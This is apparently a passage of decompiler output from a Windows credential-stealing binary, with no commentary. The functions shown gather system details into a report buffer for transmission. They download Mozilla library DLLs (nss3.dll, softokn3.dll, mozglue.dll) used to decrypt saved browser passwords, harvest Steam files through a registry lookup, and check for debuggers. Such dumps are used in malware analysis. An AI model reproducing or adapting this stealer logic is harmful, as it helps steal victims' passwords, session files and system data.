  uStack00000014 = 0;
  param_1 = (int *)((uint)param_1 & 0xffffff00);
  if (0xf < in_stack_00000034) {
    FUN_003aee4b(in_stack_00000020);
    uVar4 = extraout_EDX_03;
  }
  in_stack_00000034 = 0xf;
  uStack00000030 = 0;
  in_stack_00000020 = (void *)((uint)in_stack_00000020 & 0xffffff00);
  if (0xf < in_stack_00000050) {
    FUN_003aee4b(in_stack_0000003c);
    uVar4 = extraout_EDX_04;
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar4,uVar6);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __thiscall FUN_00392c50(void *this,int param_1)

{
  char *pcVar1;
  undefined4 uVar2;
  undefined4 extraout_ECX;
  uchar *unaff_EDI;
  undefined8 uVar3;
  undefined uVar4;
  undefined4 uVar5;
  char *local_140;
  undefined local_13c [296];
  undefined4 local_14;
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_140 = (char *)0x0;
  if (DAT_003d92dc == (int *)0x0) {
    _DAT_003d96b0 = 0x10000;
  }
  else {
    if (*DAT_003d92dc == 1) {
      _DAT_003d96b0 =
           FUN_0038e030(&local_140,(undefined (*) [16])local_13c,(char **)DAT_003d92dc[1],
                        (char *)this);
    }
    else {
      _DAT_003d96b0 = 0x80000;
    }
  }
  pcVar1 = local_140;
  uVar5 = local_14;
  uVar2 = (*_DAT_003d957c)(0);
  uVar4 = (undefined)uVar5;
  uVar3 = (*_DAT_003d9504)(uVar2);
  if (param_1 == 0) {
    if (DAT_003d92dc == (int *)0x0) {
      _DAT_003d96b0 = 0x10000;
    }
    else {
      if (*DAT_003d92dc == 1) {
        _DAT_003d96b0 =
             FUN_0038e120((char **)DAT_003d92dc[1],local_14,pcVar1,(uchar *)uVar3,(void *)local_14,3
                         );
      }
      else {
        _DAT_003d96b0 = 0x80000;
      }
    }
  }
  else {
    FUN_0038e730(extraout_ECX,(int)((ulonglong)uVar3 >> 0x20),pcVar1,unaff_EDI);
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,local_14,uVar4);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00392d30(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  undefined4 extraout_EDX;
  undefined4 uVar3;
  int **in_FS_OFFSET;
  undefined8 uVar4;
  uint in_stack_ffffdf98;
  undefined4 *puVar5;
  uint uVar6;
  undefined uVar7;
  undefined *puStack8220;
  undefined4 local_1ffc;
  undefined4 local_1ff8;
  undefined4 local_1ff0;
  undefined4 local_1fe8;
  undefined4 uStack8164;
  void *local_1fdc;
  undefined4 uStack8140;
  uint uStack8136;
  void *pvStack8128;
  undefined4 uStack8112;
  uint uStack8108;
  void *pvStack8100;
  uint uStack8080;
  undefined auStack8072 [40];
  undefined local_1f60 [960];
  undefined auStack7072 [8];
  char acStack7064 [24];
  undefined auStack7040 [8];
  undefined local_1b78 [960];
  undefined auStack6072 [32];
  undefined auStack6040 [8];
  undefined local_1790 [956];
  int *apiStack5076 [11];
  undefined local_13a8 [4960];
  uint uStack72;
  int *piStack64;
  undefined4 uStack52;
  undefined4 uStack44;
  uint local_1c;
  int *local_14;
  undefined *puStack16;
  undefined4 uStack12;
  
  uStack12 = 0xffffffff;
  puStack16 = &LAB_003c36b1;
  local_14 = *in_FS_OFFSET;
  local_1c = DAT_003d6664 ^ (uint)&local_1ffc;
  *in_FS_OFFSET = (int *)&local_14;
  local_1ffc = *param_1;
  local_1ff8 = param_1[1];
  trim_string((undefined (*) [16])&local_1ff0,0,0x3c);
  trim_string((undefined (*) [16])local_13a8,0,5000);
  trim_string((undefined (*) [16])local_1b78,0,1000);
  trim_string((undefined (*) [16])local_1790,0,1000);
  trim_string((undefined (*) [16])local_1f60,0,1000);
  local_1ff0 = 0x3c;
  local_1fe8 = 0xffffffff;
  local_1fdc = (void *)0xffffffff;
  local_1fdc = (void *)FUN_003ae40b(0x400);
  uStack8164 = FUN_003ae40b(0x400);
  iVar1 = (*_DAT_003d93fc)();
  if (iVar1 == 0) {
    puStack8220 = auStack7040;
    (*_DAT_003d9520)();
    (*_DAT_003d9520)();
    uVar7 = 0;
  }
  else {
    (*_DAT_003d9374)();
    puStack8220 = auStack6040;
    (*_DAT_003d9520)();
    (*_DAT_003d9520)();
    uVar7 = 0x2c;
  }
  (*_DAT_003d9520)();
  FUN_003a3880();
  uStack44 = 0;
  FUN_0038ea90();
  uStack44._0_1_ = 1;
  FUN_0038ea10();
  uStack44 = CONCAT31(uStack44._1_3_,2);
  FUN_003b1703(acStack7064);
  uVar6 = 0;
  puVar5 = (undefined4 *)(in_stack_ffffdf98 & 0xffffff00);
  FUN_003896c0(&stack0xffffdf98,(int **)&DAT_003d7304,(int *)0x0,(int *)0xffffffff);
  FUN_00398900(&DAT_003d0c30,(uint)puStack8220,puVar5);
  (*_DAT_003d9520)();
  if (0xf < uStack8136) {
    FUN_003aee4b(local_1fdc);
  }
  uStack8136 = 0xf;
  uStack8140 = 0;
  local_1fdc = (void *)((uint)local_1fdc & 0xffffff00);
  if (0xf < uStack8108) {
    FUN_003aee4b(pvStack8128);
  }
  uStack52 = 0xffffffff;
  uStack8108 = 0xf;
  uStack8112 = 0;
  pvStack8128 = (void *)((uint)pvStack8128 & 0xffffff00);
  if (0xf < uStack8080) {
    FUN_003aee4b(pvStack8100);
  }
  trim_string((undefined (*) [16])&stack0xffffdfe8,0,0x3c);
  trim_string((undefined (*) [16])auStack7072,0,1000);
  trim_string((undefined (*) [16])auStack6072,0,1000);
  trim_string((undefined (*) [16])auStack8072,0,1000);
  iVar1 = (*_DAT_003d9418)();
  if (iVar1 < 5) {
    uVar4 = (*_DAT_003d9418)();
    uVar3 = (undefined4)((ulonglong)uVar4 >> 0x20);
    _DAT_003d96f0 = 1;
    if ((int)uVar4 != 2) {
      _DAT_003d96f0 = 0;
    }
  }
  else {
    puVar5 = (undefined4 *)(uVar6 & 0xffffff00);
    piVar2 = (int *)_strlen((char *)apiStack5076);
    FUN_003894c0(&stack0xffffdfac,apiStack5076,piVar2);
    FUN_0038ecd0(puVar5);
    _DAT_003d96f0 = 1;
    uVar3 = extraout_EDX;
  }
  *in_FS_OFFSET = piStack64;
  terminate_if_debugger_present(uStack72 ^ (uint)&stack0xffffdfd8,uVar3,uVar7);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00393120(void)

{
  int *piVar1;
  uint uVar2;
  undefined4 *puVar3;
  undefined4 uVar4;
  int iVar5;
  undefined *puVar6;
  undefined4 extraout_EDX;
  int **in_FS_OFFSET;
  undefined uVar7;
  int iStack100744;
  undefined4 auStack100740 [9];
  undefined auStack100704 [392];
  void *apvStack100312 [3];
  undefined2 uStack100300;
  undefined2 uStack100298;
  uint uStack100296;
  uint uStack100292;
  undefined2 uStack100288;
  undefined auStack100284 [100000];
  undefined local_11c [264];
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c447e;
  local_10 = *in_FS_OFFSET;
  uVar2 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  piVar1 = DAT_003d92ec;
  local_14 = uVar2;
  trim_string((undefined (*) [16])auStack100284,0,100000);
  (*_DAT_003d9520)(auStack100284,DAT_003d8a78,uVar2);
  puVar3 = (undefined4 *)FUN_0038ea50();
  local_8 = 0;
  if (0xf < (uint)puVar3[5]) {
    puVar3 = (undefined4 *)*puVar3;
  }
  (*_DAT_003d9520)(auStack100284,puVar3);
  local_8 = 0xffffffff;
  if (0xf < uStack100292) {
    FUN_003aee4b(apvStack100312[0]);
  }
  uStack100292 = 0xf;
  uStack100296 = 0;
  apvStack100312[0] = (void *)((uint)apvStack100312[0] & 0xffffff00);
  (*_DAT_003d9520)(auStack100284,&DAT_003d0c34);
  (*_DAT_003d9520)(auStack100284,DAT_003d910c);
  uVar4 = (*_DAT_003d957c)(0,0x104);
  uVar4 = (*_DAT_003d9504)(uVar4);
  (*_DAT_003d94a8)(&uStack100300);
  (*_DAT_003d9374)(uVar4,"%d/%d/%d %d:%d:%d",uStack100296 >> 0x10,uStack100298,uStack100300,
                   uStack100292 & 0xffff,uStack100292 >> 0x10,uStack100288);
  (*_DAT_003d9520)(auStack100284,uVar4);
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  (*_DAT_003d9520)(auStack100284,DAT_003d8cec);
  puVar3 = (undefined4 *)FUN_003a4420();
  local_8 = 1;
  if (0xf < (uint)puVar3[5]) {
    puVar3 = (undefined4 *)*puVar3;
  }
  (*_DAT_003d9520)(auStack100284,puVar3);
  local_8 = 0xffffffff;
  if (0xf < uStack100292) {
    FUN_003aee4b(apvStack100312[0]);
  }
  uStack100292 = 0xf;
  uStack100296 = 0;
  apvStack100312[0] = (void *)((uint)apvStack100312[0] & 0xffffff00);
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  (*_DAT_003d9520)(auStack100284,DAT_003d90bc);
  puVar3 = (undefined4 *)FUN_003a43a0();
  local_8 = 2;
  if (0xf < (uint)puVar3[5]) {
    puVar3 = (undefined4 *)*puVar3;
  }
  (*_DAT_003d9520)(auStack100284,puVar3);
  local_8 = 0xffffffff;
  if (0xf < uStack100292) {
    FUN_003aee4b(apvStack100312[0]);
  }
  uStack100292 = 0xf;
  uStack100296 = 0;
  apvStack100312[0] = (void *)((uint)apvStack100312[0] & 0xffffff00);
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  (*_DAT_003d9520)(auStack100284,DAT_003d9154);
  puVar3 = (undefined4 *)FUN_003a3880();
  local_8 = 3;
  if (0xf < (uint)puVar3[5]) {
    puVar3 = (undefined4 *)*puVar3;
  }
  (*_DAT_003d9520)(auStack100284,puVar3);
  local_8 = 0xffffffff;
  if (0xf < uStack100292) {
    FUN_003aee4b(apvStack100312[0]);
  }
  uStack100292 = 0xf;
  uStack100296 = 0;
  apvStack100312[0] = (void *)((uint)apvStack100312[0] & 0xffffff00);
  (*_DAT_003d9520)(auStack100284,&DAT_003d0c34);
  (*_DAT_003d9520)(auStack100284,DAT_003d9250);
  uVar4 = (*_DAT_003d9494)();
  puVar3 = (undefined4 *)FUN_003a5af0(uVar4);
  local_8 = 4;
  if (0xf < (uint)puVar3[5]) {
    puVar3 = (undefined4 *)*puVar3;
  }
  (*_DAT_003d9520)(auStack100284,puVar3);
  local_8 = 0xffffffff;
  if (0xf < uStack100292) {
    FUN_003aee4b(apvStack100312[0]);
  }
  uStack100292 = 0xf;
  uStack100296 = 0;
  apvStack100312[0] = (void *)((uint)apvStack100312[0] & 0xffffff00);
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  (*_DAT_003d9520)(auStack100284,DAT_003d8c34);
  (*_DAT_003d9520)(auStack100284,&DAT_003d0c34);
  (*_DAT_003d9520)(auStack100284,DAT_003d8d5c);
  uVar4 = FUN_003a42e0();
  (*_DAT_003d9520)(auStack100284,uVar4);
  (*_DAT_003d9520)(auStack100284,&DAT_003d0c38);
  iStack100744 = 0;
  uVar4 = (*_DAT_003d959c)(&iStack100744);
  iVar5 = (*_DAT_003d9540)(uVar4);
  if ((iVar5 == 0) || (puVar6 = &DAT_003d192c, iStack100744 == 0)) {
    puVar6 = &DAT_003d1930;
  }
  (*_DAT_003d9520)(auStack100284,puVar6);
  (*_DAT_003d9520)(auStack100284,&DAT_003d0c3c);
  (*_DAT_003d9520)(auStack100284,"Install date: ");
  uVar4 = FUN_003a4d50();
  (*_DAT_003d9520)(auStack100284,uVar4);
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  (*_DAT_003d9520)(auStack100284,&DAT_003d0c50);
  uVar4 = FUN_003a4f30();
  (*_DAT_003d9520)(auStack100284,uVar4);
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  (*_DAT_003d9520)(auStack100284,DAT_003d90d0);
  uVar4 = FUN_003a4280();
  (*_DAT_003d9520)(auStack100284,uVar4);
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  (*_DAT_003d9520)(auStack100284,DAT_003d8bdc);
  iStack100744 = 0x101;
  (*_DAT_003d944c)(local_11c,&iStack100744);
  (*_DAT_003d9520)(auStack100284,local_11c);
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  (*_DAT_003d9520)(auStack100284,DAT_003d909c);
  puVar3 = (undefined4 *)FUN_003a4510((undefined *)apvStack100312);
  local_8 = 5;
  if (0xf < (uint)puVar3[5]) {
    puVar3 = (undefined4 *)*puVar3;
  }
  (*_DAT_003d9520)(auStack100284,puVar3);
  local_8 = 0xffffffff;
  if (0xf < uStack100292) {
    FUN_003aee4b(apvStack100312[0]);
  }
  uStack100292 = 0xf;
  uStack100296 = 0;
  apvStack100312[0] = (void *)((uint)apvStack100312[0] & 0xffffff00);
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  (*_DAT_003d9520)(auStack100284,DAT_003d8e64);
  puVar3 = (undefined4 *)FUN_003a4680();
  local_8 = 6;
  if (0xf < (uint)puVar3[5]) {
    puVar3 = (undefined4 *)*puVar3;
  }
  (*_DAT_003d9520)(auStack100284,puVar3);
  local_8 = 0xffffffff;
  if (0xf < uStack100292) {
    FUN_003aee4b(apvStack100312[0]);
  }
  uStack100292 = 0xf;
  uStack100296 = 0;
  apvStack100312[0] = (void *)((uint)apvStack100312[0] & 0xffffff00);
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  (*_DAT_003d9520)(auStack100284,DAT_003d8ed4);
  uVar4 = FUN_003a4940();
  (*_DAT_003d9520)(auStack100284,uVar4);
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  (*_DAT_003d9520)(auStack100284,DAT_003d92b8);
  uVar4 = (*_DAT_003d957c)(0,0x104);
  uVar4 = (*_DAT_003d9504)(uVar4);
  (*_DAT_003d94a8)(&uStack100300);
  (*_DAT_003d9374)(uVar4,"%d/%d/%d %d:%d:%d",uStack100296 >> 0x10,uStack100298,uStack100300,
                   uStack100292 & 0xffff,uStack100292 >> 0x10,uStack100288);
  (*_DAT_003d9520)(auStack100284,uVar4);
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  (*_DAT_003d9520)(auStack100284,DAT_003d8a90);
  puVar3 = (undefined4 *)FUN_003a4840();
  local_8 = 7;
  if (0xf < (uint)puVar3[5]) {
    puVar3 = (undefined4 *)*puVar3;
  }
  (*_DAT_003d9520)(auStack100284,puVar3);
  local_8 = 0xffffffff;
  if (0xf < uStack100292) {
    FUN_003aee4b(apvStack100312[0]);
  }
  uStack100292 = 0xf;
  uStack100296 = 0;
  apvStack100312[0] = (void *)((uint)apvStack100312[0] & 0xffffff00);
  (*_DAT_003d9520)(auStack100284,&DAT_003d0c34);
  (*_DAT_003d9520)(auStack100284,DAT_003d90f4);
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  (*_DAT_003d9520)(auStack100284,DAT_003d8acc);
  uVar4 = FUN_003a3f50();
  (*_DAT_003d9520)(auStack100284,uVar4);
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  (*_DAT_003d9520)(auStack100284,"Cores: ");
  iVar5 = FUN_003a3e90();
  puVar3 = (undefined4 *)FUN_003a5670(iVar5);
  local_8 = 8;
  if (0xf < (uint)puVar3[5]) {
    puVar3 = (undefined4 *)*puVar3;
  }
  (*_DAT_003d9520)(auStack100284,puVar3);
  local_8 = 0xffffffff;
  if (0xf < uStack100292) {
    FUN_003aee4b(apvStack100312[0]);
  }
  uStack100292 = 0xf;
  uStack100296 = 0;
  apvStack100312[0] = (void *)((uint)apvStack100312[0] & 0xffffff00);
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  (*_DAT_003d9520)(auStack100284,"Threads: ");
  puVar3 = (undefined4 *)FUN_003a3de0();
  local_8 = 9;
  if (0xf < (uint)puVar3[5]) {
    puVar3 = (undefined4 *)*puVar3;
  }
  (*_DAT_003d9520)(auStack100284,puVar3);
  local_8 = 0xffffffff;
  if (0xf < uStack100292) {
    FUN_003aee4b(apvStack100312[0]);
  }
  uStack100292 = 0xf;
  uStack100296 = 0;
  apvStack100312[0] = (void *)((uint)apvStack100312[0] & 0xffffff00);
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  (*_DAT_003d9520)(auStack100284,DAT_003d8b84);
  uVar4 = FUN_003a41f0();
  (*_DAT_003d9520)(auStack100284,uVar4);
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  (*_DAT_003d9520)(auStack100284,DAT_003d8fe8);
  auStack100740[0] = 0x1a8;
  (*_DAT_003d94fc)(0,0,auStack100740,1);
  (*_DAT_003d9520)(auStack100284,auStack100704);
  (*_DAT_003d9520)(auStack100284,&DAT_003d0c34);
  (*_DAT_003d9520)(auStack100284,DAT_003d8c18);
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  FUN_003a4a50();
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  uVar4 = DAT_003d8b40;
  (*_DAT_003d9520)(auStack100284);
  uVar7 = (undefined)uVar4;
  (*_DAT_003d9520)(auStack100284,&DAT_003ce668);
  FUN_003a4010();
  iVar5 = (*_DAT_003d9418)(auStack100284);
  if (piVar1 == (int *)0x0) {
    _DAT_003d9814 = 0x10000;
  }
  else {
    if (*piVar1 == 2) {
      _DAT_003d9814 = FUN_003ad750((char **)piVar1[1],(int)auStack100284,DAT_003d8dc8,iVar5,3);
    }
    else {
      _DAT_003d9814 = 0x80000;
    }
  }
  trim_string((undefined (*) [16])auStack100284,0,100000);
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar7);
  return;
}



// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00393b70(void)

{
  int **ppiVar1;
  uint uVar2;
  int *piVar3;
  undefined4 *puVar4;
  undefined4 uVar5;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  undefined4 extraout_EDX_05;
  undefined4 extraout_EDX_06;
  int **in_FS_OFFSET;
  undefined in_stack_fffffe7c;
  char *local_180;
  undefined local_17c [296];
  undefined4 local_54;
  void *local_4c [4];
  undefined4 local_3c;
  uint local_38;
  void *local_30 [5];
  uint local_1c;
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c5108;
  local_10 = *in_FS_OFFSET;
  uVar2 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  ppiVar1 = DAT_003d9098;
  local_38 = 0xf;
  local_3c = 0;
  local_4c[0] = (void *)((uint)local_4c[0] & 0xffffff00);
  local_14 = uVar2;
  piVar3 = (int *)_strlen((char *)DAT_003d9098);
  FUN_003894c0(local_4c,ppiVar1,piVar3);
  local_8 = 0;
  uVar5 = extraout_EDX;
  if (_DAT_003d96f8 == 0) {
    puVar4 = FUN_00395c10(local_30,local_4c);
    local_8._0_1_ = 1;
    if (0xf < (uint)puVar4[5]) {
      puVar4 = (undefined4 *)*puVar4;
    }
    local_180 = (char *)0x0;
    if (DAT_003d92dc == (int *)0x0) {
      _DAT_003d96b0 = 0x10000;
    }
    else {
      if (*DAT_003d92dc == 1) {
        _DAT_003d96b0 =
             FUN_0038e030(&local_180,(undefined (*) [16])local_17c,(char **)DAT_003d92dc[1],
                          "vcruntime140.dll");
      }
      else {
        _DAT_003d96b0 = 0x80000;
      }
    }
    uVar5 = (*_DAT_003d957c)(0,local_54,uVar2);
    (*_DAT_003d9504)(uVar5);
    FUN_0038e730(extraout_ECX,extraout_EDX_00,local_180,(uchar *)puVar4);
    local_8._0_1_ = 0;
    if (0xf < local_1c) {
      FUN_003aee4b(local_30[0]);
    }
    puVar4 = FUN_00395c10(local_30,local_4c);
    local_8._0_1_ = 2;
    if (0xf < (uint)puVar4[5]) {
      puVar4 = (undefined4 *)*puVar4;
    }
    local_180 = (char *)0x0;
    if (DAT_003d92dc == (int *)0x0) {
      _DAT_003d96b0 = 0x10000;
    }
    else {
      if (*DAT_003d92dc == 1) {
        _DAT_003d96b0 =
             FUN_0038e030(&local_180,(undefined (*) [16])local_17c,(char **)DAT_003d92dc[1],
                          "softokn3.dll");
      }
      else {
        _DAT_003d96b0 = 0x80000;
      }
    }
    uVar5 = (*_DAT_003d957c)(0,local_54);
    (*_DAT_003d9504)(uVar5);
    FUN_0038e730(extraout_ECX_00,local_180,local_180,(uchar *)puVar4);
    local_8._0_1_ = 0;
    if (0xf < local_1c) {
      FUN_003aee4b(local_30[0]);
    }
    puVar4 = FUN_00395c10(local_30,local_4c);
    local_8._0_1_ = 3;
    if (0xf < (uint)puVar4[5]) {
      puVar4 = (undefined4 *)*puVar4;
    }
    local_180 = (char *)0x0;
    if (DAT_003d92dc == (int *)0x0) {
      _DAT_003d96b0 = 0x10000;
    }
    else {
      if (*DAT_003d92dc == 1) {
        _DAT_003d96b0 =
             FUN_0038e030(&local_180,(undefined (*) [16])local_17c,(char **)DAT_003d92dc[1],
                          "nss3.dll");
      }
      else {
        _DAT_003d96b0 = 0x80000;
      }
    }
    uVar5 = (*_DAT_003d957c)(0,local_54);
    (*_DAT_003d9504)(uVar5);
    FUN_0038e730(local_180,extraout_EDX_01,local_180,(uchar *)puVar4);
    local_8._0_1_ = 0;
    if (0xf < local_1c) {
      FUN_003aee4b(local_30[0]);
    }
    puVar4 = FUN_00395c10(local_30,local_4c);
    local_8._0_1_ = 4;
    if (0xf < (uint)puVar4[5]) {
      puVar4 = (undefined4 *)*puVar4;
    }
    local_180 = (char *)0x0;
    if (DAT_003d92dc == (int *)0x0) {
      _DAT_003d96b0 = 0x10000;
    }
    else {
      if (*DAT_003d92dc == 1) {
        _DAT_003d96b0 =
             FUN_0038e030(&local_180,(undefined (*) [16])local_17c,(char **)DAT_003d92dc[1],
                          "msvcp140.dll");
      }
      else {
        _DAT_003d96b0 = 0x80000;
      }
    }
    uVar5 = (*_DAT_003d957c)(0,local_54);
    (*_DAT_003d9504)(uVar5);
    FUN_0038e730(extraout_ECX_01,extraout_EDX_02,local_180,(uchar *)puVar4);
    local_8._0_1_ = 0;
    if (0xf < local_1c) {
      FUN_003aee4b(local_30[0]);
    }
    puVar4 = FUN_00395c10(local_30,local_4c);
    local_8._0_1_ = 5;
    if (0xf < (uint)puVar4[5]) {
      puVar4 = (undefined4 *)*puVar4;
    }
    local_180 = (char *)0x0;
    if (DAT_003d92dc == (int *)0x0) {
      _DAT_003d96b0 = 0x10000;
    }
    else {
      if (*DAT_003d92dc == 1) {
        _DAT_003d96b0 =
             FUN_0038e030(&local_180,(undefined (*) [16])local_17c,(char **)DAT_003d92dc[1],
                          "mozglue.dll");
      }
      else {
        _DAT_003d96b0 = 0x80000;
      }
    }
    uVar5 = (*_DAT_003d957c)(0,local_54);
    (*_DAT_003d9504)(uVar5);
    FUN_0038e730(extraout_ECX_02,local_180,local_180,(uchar *)puVar4);
    local_8._0_1_ = 0;
    if (0xf < local_1c) {
      FUN_003aee4b(local_30[0]);
    }
    puVar4 = FUN_00395c10(local_30,local_4c);
    local_8 = CONCAT31(local_8._1_3_,6);
    if (0xf < (uint)puVar4[5]) {
      puVar4 = (undefined4 *)*puVar4;
    }
    local_180 = (char *)0x0;
    if (DAT_003d92dc == (int *)0x0) {
      _DAT_003d96b0 = 0x10000;
    }
    else {
      if (*DAT_003d92dc == 1) {
        _DAT_003d96b0 =
             FUN_0038e030(&local_180,(undefined (*) [16])local_17c,(char **)DAT_003d92dc[1],
                          "freebl3.dll");
      }
      else {
        _DAT_003d96b0 = 0x80000;
      }
    }
    uVar5 = (*_DAT_003d957c)(0,local_54);
    (*_DAT_003d9504)(uVar5);
    FUN_0038e730(local_180,extraout_EDX_03,local_180,(uchar *)puVar4);
    uVar5 = extraout_EDX_04;
    if (0xf < local_1c) {
      FUN_003aee4b(local_30[0]);
      uVar5 = extraout_EDX_05;
    }
    _DAT_003d96f8 = 1;
  }
  if (0xf < local_38) {
    FUN_003aee4b(local_4c[0]);
    uVar5 = extraout_EDX_06;
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar5,in_stack_fffffe7c);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00394000(undefined4 param_1)

{
  int iVar1;
  int iVar2;
  undefined4 extraout_EDX;
  undefined4 uVar3;
  undefined8 uVar4;
  undefined uVar5;
  undefined local_468 [44];
  undefined local_43c [276];
  undefined local_328 [264];
  undefined local_220 [264];
  undefined local_118 [268];
  uint local_c;
  undefined *puVar6;
  
  local_c = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  (*_DAT_003d9374)(local_328,"%s\\%s");
  puVar6 = local_468;
  uVar4 = (*_DAT_003d95e0)(local_328);
  uVar3 = (undefined4)((ulonglong)uVar4 >> 0x20);
  iVar1 = (int)uVar4;
  uVar5 = SUB41(puVar6,0);
  if (iVar1 != -1) {
    do {
      iVar2 = (*_DAT_003d9550)(local_43c,&DAT_003d0ab0);
      if ((iVar2 != 0) && (iVar2 = (*_DAT_003d9550)(local_43c,&DAT_003d0ab4), iVar2 != 0)) {
        trim_string((undefined (*) [16])local_220,0,0x104);
        trim_string((undefined (*) [16])local_118,0,0x104);
        (*_DAT_003d9520)(local_220,"\\Soft\\Steam\\");
        (*_DAT_003d9520)(local_220,local_43c);
        (*_DAT_003d9520)(local_118);
        (*_DAT_003d9520)(local_118,&DAT_003ce7fc);
        (*_DAT_003d9520)(local_118,local_43c);
        if (DAT_003d92ec == (int *)0x0) {
          _DAT_003d9814 = 0x10000;
        }
        else {
          if (*DAT_003d92ec == 2) {
            _DAT_003d9814 = FUN_003ad750((char **)DAT_003d92ec[1],(int)local_118,local_220,0,2);
          }
          else {
            _DAT_003d9814 = 0x80000;
          }
        }
      }
      iVar2 = (*_DAT_003d9438)(iVar1,local_468);
      uVar5 = SUB41(puVar6,0);
    } while (iVar2 != 0);
    (*_DAT_003d93a8)(iVar1);
    uVar3 = extraout_EDX;
  }
  terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,uVar3,uVar5);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00394180(void)

{
  int iVar1;
  undefined4 extraout_EDX;
  undefined uVar2;
  undefined4 local_21c;
  undefined4 local_218;
  undefined local_214;
  undefined local_213 [255];
  undefined local_114 [268];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_21c = 0xff;
  local_214 = 0;
  trim_string((undefined (*) [16])local_213,0,0xfe);
  iVar1 = (*_DAT_003d9448)(0x80000001,DAT_003d8e1c,0,0x20119,&local_218);
  if (iVar1 == 0) {
    (*_DAT_003d942c)(local_218,DAT_003d91ac,0,0,&local_214,&local_21c);
  }
  (*_DAT_003d94d0)(local_218);
  trim_string((undefined (*) [16])local_114,0,0x104);
  (*_DAT_003d9520)(local_114,&local_214);
  uVar2 = 0xd4;
  (*_DAT_003d9520)(local_114);
  FUN_00394000(DAT_003d8b18);
  FUN_00394000(DAT_003d8da8);
  FUN_00394000(DAT_003d8abc);
  FUN_00394000(DAT_003d9268);
  FUN_00394000(DAT_003d8e08);
  FUN_00394000(DAT_003d900c);
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar2);
  return;
}



// WARNING: Removing unreachable block (ram,0x00394a4d)
// WARNING: Removing unreachable block (ram,0x00394954)
// WARNING: Removing unreachable block (ram,0x0039491b)
// WARNING: Removing unreachable block (ram,0x003948a9)
// WARNING: Removing unreachable block (ram,0x0039452b)
// WARNING: Removing unreachable block (ram,0x003947ab)
// WARNING: Removing unreachable block (ram,0x00394870)
// WARNING: Removing unreachable block (ram,0x003948e2)
// WARNING: Removing unreachable block (ram,0x003949a7)
// WARNING: Removing unreachable block (ram,0x00394a82)
// WARNING: Removing unreachable block (ram,0x0039481d)
// WARNING: Removing unreachable block (ram,0x003949fa)
// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003942d0(void)

{
  int iVar1;
  int *piVar2;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 uVar3;
  int **in_FS_OFFSET;
  int *in_stack_fffffe18;
  int *in_stack_fffffe20;
  int *in_stack_fffffe28;
  int *in_stack_fffffe38;
  undefined4 *in_stack_fffffe48;
  undefined uVar4;
  int **ppiVar5;
  void *local_150;
  uint local_13c;
  void *local_134;
  uint local_120;
  int *local_118 [65];
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c411f;
  local_10 = *in_FS_OFFSET;
  local_14 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  trim_string((undefined (*) [16])local_118,0,0x104);
  (*_DAT_003d9520)();
  FUN_0038ea10();
  local_8 = 0;
